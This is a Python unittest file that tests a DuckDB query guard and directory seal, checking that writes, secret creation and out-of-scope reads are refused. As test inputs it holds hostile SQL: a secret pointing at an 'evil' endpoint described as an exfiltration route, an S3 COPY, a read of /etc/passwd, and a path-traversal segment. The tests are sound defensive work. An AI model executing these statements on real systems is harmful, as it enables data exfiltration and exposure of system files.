"""The lake's two refusals that need no database: what authored SQL may say,
and what a sealed connection may touch. The end-to-end run is
p8-subsystems/dev/tests/content/e2e-lake.py; these are the parts of it that
hold on any machine with duckdb installed, so CI runs them."""

import os
import tempfile
import unittest

try:
    import duckdb  # noqa: F401
except ModuleNotFoundError:  # the lake extra is optional
    duckdb = None

from percolate_core.worker.templates import TerminalError


@unittest.skipIf(duckdb is None, "the lake extra is not installed")
class SingleSelectTest(unittest.TestCase):
    def setUp(self):
        from percolate_core.lake.guard import single_select
        self.check = single_select

    def test_a_select_and_a_cte_pass(self):
        self.check("select 1")
        self.check("with x as (select 1 as a) select a from x")

    def test_every_write_shape_is_refused(self):
        # The first is the one that was measured to exfiltrate: a secret with a
        # foreign endpoint, scoped to an allowed prefix, then a COPY into it.
        for sql in ("create secret s (type s3, key_id 'k', secret 's', endpoint 'evil:9000')",
                    "copy (select 1) to 's3://allowed/x.parquet'",
                    "select 1; create table t as select 1",
                    "attach 'x.db' as x",
                    "install httpfs",
                    "set enable_external_access = true",
                    "pragma enable_profiling"):
            with self.subTest(sql=sql), self.assertRaises(TerminalError):
                self.check(sql)

    def test_a_statement_hidden_inside_query_is_refused_by_duckdb_itself(self):
        # query() parses its argument as a SELECT and nothing else. The guard
        # passes this -- it IS one SELECT -- and DuckDB refuses at bind, which
        # is the property: the two agree about what a SELECT is.
        self.check("select * from query('create secret s (type s3)')")
        con = duckdb.connect()
        with self.assertRaises(duckdb.Error):
            con.execute("select * from query('create secret s (type s3)')")


@unittest.skipIf(duckdb is None, "the lake extra is not installed")
class SealTest(unittest.TestCase):
    def setUp(self):
        from percolate_core.lake import engine
        self.engine = engine
        self.root = tempfile.mkdtemp()
        for name in ("mine", "theirs"):
            os.makedirs(os.path.join(self.root, name))
            duckdb.connect().execute(
                f"copy (select '{name}' as who) to '{self.root}/{name}/part.parquet'")

    def sealed(self):
        con = duckdb.connect(config={"allow_persistent_secrets": False,
                                     "allow_unredacted_secrets": False})
        self.engine.seal(con, [f"{self.root}/mine/*.parquet"])
        return con

    def test_reads_inside_the_allowed_directory_and_nothing_else(self):
        con = self.sealed()
        self.assertEqual(con.execute(f"select who from '{self.root}/mine/*.parquet'").fetchone()[0], "mine")
        for sql in (f"select * from '{self.root}/theirs/part.parquet'",
                    f"select * from '{self.root}/*/part.parquet'",
                    "select * from read_csv('/etc/passwd')"):
            with self.subTest(sql=sql), self.assertRaises(duckdb.Error):
                con.execute(sql).fetchall()

    def test_the_seal_cannot_be_taken_back(self):
        con = self.sealed()
        for sql in ("set enable_external_access = true",
                    f"set allowed_directories = ['{self.root}/theirs/']",
                    "set lock_configuration = false"):
            with self.subTest(sql=sql), self.assertRaises(duckdb.Error):
                con.execute(sql)

    def test_a_directory_is_not_a_prefix_of_its_neighbour(self):
        # `…/mine` must not also allow `…/mine_private`.
        os.makedirs(os.path.join(self.root, "mine_private"))
        duckdb.connect().execute(f"copy (select 1 as x) to '{self.root}/mine_private/p.parquet'")
        with self.assertRaises(duckdb.Error):
            self.sealed().execute(f"select * from '{self.root}/mine_private/p.parquet'").fetchall()

    def test_a_dot_segment_is_refused_before_it_reaches_the_allow_list(self):
        con = duckdb.connect()
        with self.assertRaises(TerminalError):
            self.engine.seal(con, ["s3://lake/lake/org-a/x/../../org-b/"])


if __name__ == "__main__":
    unittest.main()
